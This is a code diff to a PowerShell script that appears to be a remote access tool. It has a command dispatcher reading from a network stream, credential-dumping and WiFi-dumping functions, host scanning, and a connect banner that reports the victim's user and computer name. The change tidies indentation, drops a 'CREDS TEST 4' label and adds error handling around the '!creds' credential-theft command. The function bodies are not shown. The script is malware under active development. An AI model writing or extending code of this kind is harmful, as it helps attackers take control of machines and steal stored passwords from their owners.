@@ -387,7 +387,7 @@ function PortSuggest {
         return "[DOWNLOADED] $out"
     }
 
-   function Get-CredentialsFull {
+    function Get-CredentialsFull {
     try {
         $output = ""
         $ErrorActionPreference = 'Stop'
@@ -505,9 +505,6 @@ function PortSuggest {
         return "[ERROR] Get-CredentialsFull failed: $($_.Exception.Message)"
     }
 }
-
-
-
 
     
     function Dump-WiFi {
@@ -726,8 +723,7 @@ ________  ___  ________  ________      ________  ________
      /  / /\ \  \ \   ____\ \  \\\  \   \ \   __  \ \  \ \\ \  
     /  /_/__\ \  \ \  \___|\ \  \\\  \ __\ \  \|\  \ \  \_\\ \ 
    |\________\ \__\ \__\    \ \_______\\__\ \_______\ \_______\
-    \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|   
-                                    (CREDS TEST 4)                                                                                                                                                                     
+    \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|                                                                                                                                                                        
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
@@ -786,8 +782,12 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                         $response = Tree-List
                     }
                     elseif ($cmd -eq "!creds") {
-                        $response = Get-CredentialsFull
-                    }
+                        try {
+                            $response = Get-CredentialsFull
+                        } catch {
+                            $response = "[ERROR] Get-CredentialsFull failed: $($_.Exception.Message)"
+                        }
+}
                     elseif ($cmd -eq "scanHosts") {
                         Get-AliveHosts -stream $stream
                         $response = ""
